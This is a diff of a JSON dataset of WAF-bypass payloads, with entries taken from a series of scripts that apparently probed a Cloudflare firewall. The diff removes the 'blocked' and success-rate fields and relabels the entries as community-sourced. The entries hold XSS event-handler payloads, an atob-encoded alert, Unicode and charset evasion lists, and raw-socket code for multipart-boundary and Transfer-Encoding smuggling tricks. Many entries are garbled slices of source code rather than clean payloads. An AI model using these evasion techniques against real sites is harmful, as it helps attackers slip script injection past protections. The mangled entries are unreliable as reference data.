       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0309",
@@ -1383,11 +811,7 @@
       "description": "shy",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0310",
@@ -1397,11 +821,7 @@
       "description": "zws",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0311",
@@ -1411,11 +831,7 @@
       "description": "zwnj",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0312",
@@ -1425,11 +841,7 @@
       "description": "zwj",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0313",
@@ -1439,11 +851,7 @@
       "description": "wj",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0314",
@@ -1453,25 +861,7 @@
       "description": "bom",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0323",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path',f'/?globalHtml={enc}'),(':scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0325",
@@ -1481,11 +871,7 @@
       "description": "GET",
       "technique": "direct_injection",
       "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0326",
@@ -1495,11 +881,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0327",
@@ -1509,39 +891,7 @@
       "description": "POST",
       "technique": "direct_injection",
       "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0328",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0329",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0330",
@@ -1551,39 +901,7 @@
       "description": "application/x-www-form-urlencoded",
       "technique": "encoding",
       "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0333",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "body",
-      "description": "')[:1000]}",
-      "technique": "direct_injection",
-      "source_file": "waf_analyze_response.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0334",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "body",
-      "description": "').lower()\n        payload_lower = payload.lower()\n        \n        # Look for partial reflections\n        if '<script' in payload_lower and '<script' in body_lower:\n            print(\"\\n⚠️  REFLECTION DETECTED: <script tag reflected",
-      "technique": "direct_injection",
-      "source_file": "waf_analyze_response.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0336",
@@ -1593,11 +911,7 @@
       "description": "\\ufe65', '\\u203a', '\\u276d', '\\u276f', '\\u232a', '\\u27e9",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0337",
@@ -1607,11 +921,7 @@
       "description": "\\ufe59', '\\u207d', '\\u208d', '\\u2768', '\\u276a",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0338",
@@ -1621,11 +931,7 @@
       "description": "\\ufe5a', '\\u207e', '\\u208e', '\\u2769', '\\u276b",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0339",
@@ -1635,11 +941,7 @@
       "description": "\\u2044', '\\u2215",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0340",
@@ -1649,11 +951,7 @@
       "description": "\\ufe66', '\\u207c', '\\u208c",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0341",
@@ -1663,25 +961,7 @@
       "description": "\\u201c', '\\u201d', '\\u201e', '\\u201f', '\\u2033",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0346",
-      "category": "other",
-      "subcategory": "general",
-      "payload": " on",
-      "description": " on= on', 1) if ' on' in p else p\n    get(p2, label=\"rare-tag-on",
-      "technique": "direct_injection",
-      "source_file": "waf_round93_research3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0350",
@@ -1691,11 +971,7 @@
       "description": "on:error\", \"on:focus",
       "technique": "direct_injection",
       "source_file": "waf_round26_colon.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0370",
@@ -1705,11 +981,7 @@
       "description": " onload=",
       "technique": "direct_injection",
       "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0371",
@@ -1719,11 +991,7 @@
       "description": " onfocus=', ' autofocus>",
       "technique": "direct_injection",
       "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0372",
@@ -1733,11 +1001,7 @@
       "description": " open ontoggle=",
       "technique": "direct_injection",
       "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0373",
@@ -1747,11 +1011,7 @@
       "description": " src=x onerror=",
       "technique": "direct_injection",
       "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0374",
@@ -1761,11 +1021,7 @@
       "description": " onstart=",
       "technique": "direct_injection",
       "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0375",
@@ -1775,53 +1031,7 @@
       "description": " autofocus onfocus=",
       "technique": "direct_injection",
       "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0376",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "<div",
-      "description": " onmouseover=",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0377",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0378",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0379",
@@ -1831,81 +1041,7 @@
       "description": "application/json",
       "technique": "direct_injection",
       "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0381",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0382",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0384",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0385",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0387",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":method",
-      "description": "GET",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0388",
@@ -1915,137 +1051,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0390",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0391",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0392",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":authority', HOST),\n            ('content-type",
-      "description": "application/x-www-form-urlencoded",
-      "technique": "encoding",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0405",
-      "category": "other",
-      "subcategory": "general",
-      "payload": " on",
-      "description": " oNLy=1 on', 1) if ' on' in p else p,\n]\n\nfinal_count = 0\nfor seed in XSS_ALL:\n    for mut in FINAL_MUTS:\n        try:\n            mutated = mut(seed)\n            if mutated == seed: continue\n            # JSON\n            post_raw(json.dumps({\"globalHtml\": mutated}).encode(), ct=\"application/json\", label=\"final-json",
-      "technique": "encoding",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0406",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "load",
-      "description": "error', 'focus', 'click",
-      "technique": "direct_injection",
-      "source_file": "waf_round28_exploit.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0410",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "input",
-      "description": "focus', ' autofocus",
-      "technique": "direct_injection",
-      "source_file": "waf_round28_exploit.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0411",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "details",
-      "description": "toggle', ' open",
-      "technique": "direct_injection",
-      "source_file": "waf_round28_exploit.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0412",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "math",
-      "description": "load', '",
-      "technique": "direct_injection",
-      "source_file": "waf_round28_exploit.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0413",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "div",
-      "description": "click', '",
-      "technique": "direct_injection",
-      "source_file": "waf_round28_exploit.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0414",
@@ -2055,11 +1061,7 @@
       "description": "\\u00e8', '\\u00e9', '\\u0113",
       "technique": "direct_injection",
       "source_file": "waf_round74_oss3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0415",
@@ -2069,11 +1071,7 @@
       "description": "\\u00f2', '\\u00f3', '\\u014d",
       "technique": "direct_injection",
       "source_file": "waf_round74_oss3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0416",
@@ -2083,11 +1081,7 @@
       "description": "\\u00e7",
       "technique": "direct_injection",
       "source_file": "waf_round74_oss3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0417",
@@ -2097,53 +1091,7 @@
       "description": "\\u00ec', '\\u00ed",
       "technique": "direct_injection",
       "source_file": "waf_round74_oss3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0419",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "text/plain",
-      "description": "text/html', 'text/xml', 'application/xml',\n    'application/x-www-form-urlencoded; charset=utf-7',\n    'application/x-www-form-urlencoded; charset=utf-16',\n    'application/x-www-form-urlencoded; charset=iso-8859-1',\n    'application/x-www-form-urlencoded; charset=windows-1252',\n    'multipart/mixed',\n    'application/octet-stream',\n]\n\nfor ct in CONTENT_TYPES:\n    for p in CT_PAYLOADS:\n        body = f\"globalHtml={urllib.parse.quote(p)}\".encode()\n        raw_req(\n            b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n            b\"Content-Type: \" + ct.encode() + b\"\\r\\n\"\n            b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\"\n            b\"Connection: close\\r\\n\\r\\n\" + body)\n\nprint(f\"  CT tricks done: {total} total",
-      "technique": "encoding",
-      "source_file": "waf_round74_oss3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0420",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "PUT",
-      "description": "PATCH\", \"DELETE\", \"OPTIONS",
-      "technique": "direct_injection",
-      "source_file": "waf_round18.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0421",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "text/plain",
-      "description": "text/xml\",\n    \"application/xml\",\n    \"application/x-www-form-urlencoded; charset=utf-7\",\n    \"application/x-www-form-urlencoded; charset=utf-16\",\n    \"application/x-www-form-urlencoded; charset=ibm500\",\n    \"application/x-www-form-urlencoded; charset=iso-2022-jp\",\n]\n\nfor ct in ct_types:\n    name = f\"POST-ct-{ct.split(';",
-      "technique": "encoding",
-      "source_file": "waf_round18.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0424",
@@ -2153,11 +1101,7 @@
       "description": "Transfer-Encoding : chunked',\n        'Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x',\n        'Transfer-Encoding:\\tchunked',\n        'Transfer-Encoding: Chunked',\n        'Transfer-Encoding: CHUNKED',\n        'Transfer-encoding: chunked',\n    ]:\n        raw_req(\n            b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n            b\"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n            + te_header.encode() + b\"\\r\\n\"\n            b\"Connection: close\\r\\n\\r\\n\" + chunk.encode())\n\nprint(f\"  Smuggling done: {total} total",
       "technique": "encoding",
       "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0425",
@@ -2167,11 +1111,7 @@
       "description": "application/xml', 'application/soap+xml', 'application/graphql",
       "technique": "direct_injection",
       "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0431",
@@ -2181,25 +1121,7 @@
       "description": "<img src=x onerror=[][\"map",
       "technique": "direct_injection",
       "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0432",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "constructor\"](atob(\"YWxlcnQoMSk=\"))()>",
-      "description": "<img src=x onerror=[][\"sort",
-      "technique": "direct_injection",
-      "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0434",
@@ -2209,11 +1131,7 @@
       "description": "globalHtml\", XSS)\n    multipart_req(bound_header, body)\n\n# A3: Boundary delimiter removal (remove \\r\\n before boundary)\nbound = \"delbound\"\nbody_a3 = (\n    f\"--{bound}\\r\\n\"\n    f\"Content-Disposition: form-data; name=\\\"globalHtml\\\"\\r\\n\\r\\n\"\n    f\"{XSS}\"  # No \\r\\n before closing boundary\n    f\"--{bound}--\\r\\n",
       "technique": "direct_injection",
       "source_file": "waf_round81_waffled.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0435",
@@ -2223,11 +1141,7 @@
       "description": "globalHtml\", xss)\n    ct_dup = \"multipart/form-data; boundary=firstbound; boundary=secondbound\"\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: \" + ct_dup.encode() + b\"\\r\\n\"\n        b\"Content-Length: \" + str(len(body_dup)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body_dup)\n\n# A5: Boundary with quotes vs without\nfor xss in [XSS_SHORT, XSS]:\n    bound = \"quotedbound\"\n    body = make_multipart_body(bound, \"globalHtml\", xss)\n    # Quoted boundary in header\n    ct_q = f'multipart/form-data; boundary=\"{bound}\"'\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: \" + ct_q.encode() + b\"\\r\\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body)\n\n# A6: Whitespace/tab in Content-Type header\nfor ws in ['\\t', '  ', ' \\t', '\\t ",
       "technique": "encoding",
       "source_file": "waf_round81_waffled.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0436",
@@ -2237,25 +1151,7 @@
       "description": "globalHtml\", XSS_SHORT)\n    ct_ws = f\"multipart/form-data;{ws}boundary=wsbound\"\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: \" + ct_ws.encode() + b\"\\r\\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body)\n\n# A7: Semicolon appended to boundary\nbody = make_multipart_body(\"semibound\", \"globalHtml\", XSS_SHORT)\nmultipart_req(\"semibound;\", body)\nmultipart_req(\"semibound; \", body)\n\n# A8: Boundary with special chars\nfor ch in ['=', '+', '/', '(', ",
       "technique": "encoding",
       "source_file": "waf_round81_waffled.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0443",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "load",
-      "description": "error', 'focus', 'click",
-      "technique": "direct_injection",
-      "source_file": "waf_round27_gaps.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0466",
@@ -2265,67 +1161,7 @@
       "description": "euc-jp', 'iso-2022-jp', 'gb2312', 'euc-kr', 'big5",
       "technique": "direct_injection",
       "source_file": "waf_round53_56.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0467",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "shift_jis",
-      "description": "utf-8', '",
-      "technique": "direct_injection",
-      "source_file": "waf_round53_56.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0473",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "/\")",
-      "description": "fetch(`/`)',\n    'console.log(1)',\n    'document.domain',\n    'location=\"/\"', 'location.href=\"/\"',\n    'window.name',\n    'top.name',\n    'this.focus()',\n    'void(0)',\n    '1', '\"\"', 'null', 'undefined', 'true', 'false',\n    'name', 'self', 'top', 'parent', 'frames',\n    'history.back()',\n    'open(\"/",
-      "technique": "direct_injection",
-      "source_file": "waf_round45_print_verify.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0474",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "/\")",
-      "description": "Function(\"alert(1)",
-      "technique": "direct_injection",
-      "source_file": "waf_round45_print_verify.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0479",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "\\\\u",
-      "description": "\\\\\\\\u",
-      "technique": "direct_injection",
-      "source_file": "waf_round69_mass2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0499",
@@ -2335,11 +1171,7 @@
       "description": "globalHtml[0]\", \"<svg onload=alert(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round5.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0500",
@@ -2349,25 +1181,7 @@
       "description": "globalHtml.x\", \"<svg onload=alert(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round5.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0504",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "true",
-      "description": "true",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0505",
@@ -2377,25 +1191,7 @@
       "description": "false",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0506",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "null",
-      "description": "null",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0507",
@@ -2405,11 +1201,7 @@
       "description": "undefined",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0508",
@@ -2419,11 +1211,7 @@
       "description": "void-0",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0509",
@@ -2433,25 +1221,7 @@
       "description": "void-0-noparen",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0510",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "NaN",
-      "description": "NaN",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0511",
@@ -2461,95 +1231,7 @@
       "description": "Infinity",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0514",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "'x'",
-      "description": "str-x",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0515",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "name",
-      "description": "name",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0516",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "self",
-      "description": "self",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0517",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "top",
-      "description": "top",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0518",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "this",
-      "description": "this",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0519",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "window",
-      "description": "window",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0520",
@@ -2559,11 +1241,7 @@
       "description": "parent",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
